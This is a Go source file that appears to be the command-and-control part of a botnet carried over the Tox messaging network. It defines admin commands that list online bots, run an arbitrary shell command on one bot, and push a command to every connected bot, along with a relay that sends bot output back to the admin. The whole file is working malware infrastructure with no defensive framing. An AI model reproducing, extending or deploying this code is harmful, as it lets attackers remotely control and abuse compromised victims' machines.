package net

import (
	"fmt"
	"strconv"
	"strings"
)

func AdminHelp(senderNum uint32) {
	help := "[+] HELP\n[?] LIST - List online bots.\n[?] EXEC <BOT> <CMD> - Execute command on bot.\n[?] MASS <CMD> - Mass execute command."
	_, err := Tox_instance.FriendSendMessage(senderNum, help)
	if err != nil {
		fmt.Println(err)
	}
}

func AdminList(senderNum uint32) {
	friends := Tox_instance.SelfGetFriendList()

BOTS:
	for _, friend := range friends {
		for _, admin := range Admins {
			senderKey, err := Tox_instance.FriendGetPublicKey(friend)
			if err != nil {
				fmt.Println("[-] Error: Failed to get public key -", err)
			}
			if senderKey == admin[0:64] {
				continue BOTS
			}
		}

		status, err := Tox_instance.FriendGetConnectionStatus(friend)
		if err != nil {
			fmt.Println("[-] Error: Failed to get connection status of bot -", err)
		}
		if status != 0 {
			_, err := Tox_instance.FriendSendMessage(senderNum, "ONLINE:"+strconv.FormatUint(uint64(friend), 10))
			if err != nil {
				fmt.Println("[-] Error: Failed to send message of online bots -", err)
			}
		}
	}
}

func AdminExec(publicKey string, messages []string) {
	bot, err := strconv.ParseUint(messages[1], 10, 32)
	if err != nil {
		fmt.Println(err)
	}
	_, err = Tox_instance.FriendSendMessage(uint32(bot), publicKey+" "+strings.Join(messages[2:], " "))
	if err != nil {
		fmt.Println(err)
	}
}

func AdminMass(senderNum uint32, senderKey string, messages []string) {
	friends := Tox_instance.SelfGetFriendList()
	for _, fno := range friends {
		if fno == senderNum {
			continue
		}
		status, err := Tox_instance.FriendGetConnectionStatus(fno)
		if err != nil {
			fmt.Println(err)
		}
		if status != 0 {
			_, err = Tox_instance.FriendSendMessage(fno, senderKey+" "+strings.Join(messages[1:], " "))
			if err != nil {
				fmt.Println(err)
			}
		}
	}
}

func BotResponse(messages []string) {
	relayPub := messages[len(messages)-1]
	relayOut := messages[:len(messages)-1]

	for _, admin := range Admins {
		if relayPub == admin[0:64] {
			admin, err := Tox_instance.FriendByPublicKey(relayPub)
			if err != nil {
				fmt.Println(err)
			}
			_, err = Tox_instance.FriendSendMessage(admin, strings.Join(relayOut, " "))
			if err != nil {
				fmt.Println(err)
			}
		}
	}
}
